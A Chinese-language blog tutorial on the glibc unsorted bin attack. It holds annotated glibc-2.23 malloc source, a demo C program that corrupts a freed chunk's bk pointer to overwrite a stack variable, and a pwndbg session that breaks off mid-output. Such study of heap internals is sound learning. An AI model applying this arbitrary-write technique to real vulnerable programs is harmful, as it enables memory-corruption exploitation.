<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>unsorted bin | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>unsorted bin</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-14T01:58:29.000Z" id="date"> 2023-09-14</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-13T12:59:08.891Z" id="updated"> 2023-09-13</time></div></span><br><span>Word Count: <div class="control">4.3k</div></span><br><span>Read Time: <div class="control">20 min</div></span></div></div><hr><div id="post-content"><h1 id="关于unsorted-bin-和-unsorted-bin-attack"><a href="#关于unsorted-bin-和-unsorted-bin-attack" class="headerlink" title="关于unsorted bin 和 unsorted bin attack"></a><strong>关于unsorted bin 和 unsorted bin attack</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如<strong>修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放</strong>，又或者<strong>修改_IO_list_all来伪造_IO_FILE进行攻击</strong>。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。</p>
<blockquote>
<p>global_max_fast是main_arena中控制最大fastbin大小的变量。</p>
</blockquote>
<h2 id="unsotedbin-基本来源"><a href="#unsotedbin-基本来源" class="headerlink" title="unsotedbin 基本来源"></a><strong>unsotedbin 基本来源</strong></h2><p>1、当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于<strong>MINSIZE</strong>，就会被放到unsortedbin中。</p>
<blockquote>
<p>举个例子，如有个0x90大小的 small chunk，此时malloc(0x60)，剩下的0x30由于大于 MINSIZE ，会被放入unsortedbin 中</p>
</blockquote>
<p>2、释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。<br>3、当进行malloc_consolidate时，如果不是和top_chunk近邻的话，可能会把合并后的chunk放到unsortedbin中。</p>
<blockquote>
<p>consolidate是一个动词，其中文意思为：使加强; 使巩固; (使) 结成一体，<strong>合并</strong>;<br>因此malloc_consolidate的意思是堆中的碎片整理，目的是为了减少堆中的碎片。</p>
</blockquote>
<h2 id="unsortedbin-attack-概述"><a href="#unsortedbin-attack-概述" class="headerlink" title="unsortedbin_attack 概述"></a>unsortedbin_attack 概述</h2><p>● Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。<br>● Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 <strong>bk</strong> <strong>指针</strong>。</p>
<h2 id="unsortedbin-attack-效果"><a href="#unsortedbin-attack-效果" class="headerlink" title="unsortedbin_attack 效果"></a>unsortedbin_attack 效果</h2><p>● <strong>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。</strong></p>
<h2 id="unsortedbin-源码分析"><a href="#unsortedbin-源码分析" class="headerlink" title="unsortedbin 源码分析"></a>unsortedbin 源码分析</h2><blockquote>
<p>这里使用libc-2.23版本的源码<br>下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。<br>最重要的是最后的总结，记住就行了。</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#源码的第<span class="hljs-number">3470</span>行<span class="hljs-number">-3597</span>行<br>         <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>		#取链表尾部的chunk记作victim<br>        {<br>          bck = victim-&gt;bk;<br>          #倒数第二个chunk记作bck<br>          #接下来对victim的size位进行检查<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>		  #检查通过，计算victim得到实际chunk的大小<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #假如说我们申请的<span class="hljs-built_in">malloc</span>大小属于smallbin的范围，并且last_remainder是<br>              <span class="hljs-meta">#unsortedbin的唯一一个chunk时，优先使用这个chunk。</span><br>              <br>            {<br>              #假若满足条件则对其进行切割和解链操作<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                {<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                }<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>		  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。<br>          #其中unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #是unsorted bin attack产生的原因，<br>          #一旦我们绕过之前的检查到达这里，<br>          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)<br>          #即*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)。<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbin产生的原因：</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>		  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>    	  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            {<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>                  <br>          <span class="hljs-comment">/* place chunk in bin */</span><br>		  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，<br>          #需要根据其size放入small bin或large bin的链，<br>          #其中在后者实现中存在large bin attack，<br>          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            {<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            }<br>          <span class="hljs-keyword">else</span><br>            {<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                {<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    {<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    }<br>                  <span class="hljs-keyword">else</span><br>                    {<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        {<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        }<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        {<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        }<br>                      bck = fwd-&gt;bk;<br>                    }<br>                }<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            }<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        }<br></code></pre></td></tr></tbody></table></figure>

<h2 id="unsortedbin-attack-原理"><a href="#unsortedbin-attack-原理" class="headerlink" title="unsortedbin_attack 原理"></a>unsortedbin_attack 原理</h2><p>从下面的源码中可以看到，当将一个unsortedbin取出时，会将bck-&gt;fd的位置写入本unsortedbin的位置</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#glibc-2.23/malloc/malloc.c</span><br><span class="hljs-comment">#源码第3515-3517行</span><br>		  /* remove <span class="hljs-keyword">from</span> unsorted <span class="hljs-built_in">list</span> */<br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>//unsorted_chunks(av)其实是&amp;main_arena.top<br></code></pre></td></tr></tbody></table></figure>

<p>换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>接下来我们使用一个demo来演示unsortedbin_attack的原理：</p>
<blockquote>
<p>来源：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/tubv6q">https://www.yuque.com/hxfqg9/bin/tubv6q</a><br>感谢@yichen师傅的汉化<br>这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>大致看一下流程，然后开始进行调试。</p>
<blockquote>
<p>编译命令：gcc -g demo.c -o demo</p>
</blockquote>
<h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>首先对代码的第12行下断点，开始调试程序：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from demo...done.<br>pwndbg&gt; b 12<br>Breakpoint 1 at 0x400722: file demo.c, line 12.<br>pwndbg&gt; r<br>Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo <br>unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数<br><br><br>Breakpoint 1, <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> at demo.c:12<br>12	    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────<br> RAX  <span class="hljs-number">0x51</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04380</span> (__write_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x7ffff7dd3770</span> (_IO_stdfile_2_lock) ◂— <span class="hljs-number">0x0</span><br> RDI  <span class="hljs-number">0x2</span><br> RSI  <span class="hljs-number">0x7fffffffb6e0</span> ◂— <span class="hljs-number">0x87e5acbbe49188e6</span><br> R8   <span class="hljs-number">0x7ffff7fda700</span> ◂— <span class="hljs-number">0x7ffff7fda700</span><br> R9   <span class="hljs-number">0x51</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x4005b0</span> (_start) ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RIP  <span class="hljs-number">0x400722</span> (main+<span class="hljs-number">124</span>) ◂— mov    edi, <span class="hljs-number">0x410</span><br>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0x400722</span> &lt;main+<span class="hljs-number">124</span>&gt;    mov    edi, <span class="hljs-number">0x410</span><br>   <span class="hljs-number">0x400727</span> &lt;main+<span class="hljs-number">129</span>&gt;    call   <span class="hljs-built_in">malloc</span>@plt &lt;<span class="hljs-built_in">malloc</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40072c</span> &lt;main+<span class="hljs-number">134</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">0x10</span>], rax<br>   <span class="hljs-number">0x400730</span> &lt;main+<span class="hljs-number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x200929</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400737</span> &lt;main+<span class="hljs-number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x40073b</span> &lt;main+<span class="hljs-number">149</span>&gt;    mov    esi, <span class="hljs-number">0x400a18</span><br>   <span class="hljs-number">0x400740</span> &lt;main+<span class="hljs-number">154</span>&gt;    mov    rdi, rax<br>   <span class="hljs-number">0x400743</span> &lt;main+<span class="hljs-number">157</span>&gt;    mov    eax, <span class="hljs-number">0</span><br>   <span class="hljs-number">0x400748</span> &lt;main+<span 